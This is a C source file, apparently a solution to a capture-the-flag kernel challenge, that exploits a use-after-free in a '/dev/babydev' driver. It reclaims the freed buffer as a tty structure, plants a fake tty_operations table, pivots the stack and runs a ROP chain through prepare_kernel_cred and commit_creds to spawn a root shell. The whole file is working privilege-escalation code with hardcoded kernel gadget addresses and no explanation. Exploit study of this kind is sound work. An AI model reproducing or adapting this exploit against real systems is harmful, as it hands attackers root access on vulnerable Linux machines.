#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "fake_tty.h"
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar(10); \
};
#define dev_path "/dev/babydev"
int global_fd;
int global_fd_dup;
int ptmx;
void get_shell(){
    if(getuid()){
        log_info("No root :(");
        exit(-1);
    }
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
int64_t user_ip = (int64_t)get_shell;
int64_t user_cs;
int64_t user_rflags;
int64_t user_sp;
int64_t user_ss;
void save_state(){
    __asm__(
        //".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_sp, rsp;"
        "mov user_ss, ss;"
        "pushf;"
        "pop user_rflags;"
        //".att_syntax;"
    );
    log_info("Saved state");
}
void open_dev(){
    global_fd = open(dev_path,O_RDWR);
    global_fd_dup = open(dev_path,O_RDWR);
}
void alloc_(size_t size){
    ioctl(global_fd,65537,size);
}

int64_t read_buffer[0x200/8];
void leak(){
    read(global_fd,read_buffer,sizeof(read_buffer));
}
void overwrite(){
    write(global_fd,read_buffer,sizeof(read_buffer));
}
struct tty_operations fake_tty;
int main(){
    save_state();
    open_dev();
    alloc_(0x300);
    log_info("Allocated %u bytes",0x300);
    close(global_fd_dup);
    log_info("Freed!")
    ptmx = open("/dev/ptmx",O_RDONLY);
    log_info("Trying open /dev/ptmx");
    leak();
    fake_tty.ioctl = 0xffffffff816b316a; // push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
    read_buffer[3] = &fake_tty;
    overwrite();
    log_info("Overwrote");
    void * pivot_stack = mmap((void *)0x1336000,0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    *(int64_t *)0x1336000 = 0x1337;
    int64_t rop[]={
        1,// dummy r13
        2,// dummy rbp
        0xffffffff810d238d, // pop rdi ; ret
        0,
        0xffffffff810a1810, // prepare_kernel_cred
        0xffffffff8133b32e , // mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
        0, //dummy rbx
        0, //dummy rbp
        0xffffffff810a1420, // commit_creds
        0xffffffff81063694, // swapgs ; pop rbp ; ret
        0, //dummy rbp
        0xffffffff8181a797, // iretq
        user_ip,
        user_cs,
        user_rflags,
        user_sp,
        user_ss,
    };
    memcpy(pivot_stack+0x500,rop,sizeof(rop));
    ioctl(ptmx,0x6666,pivot_stack+0x500);
}
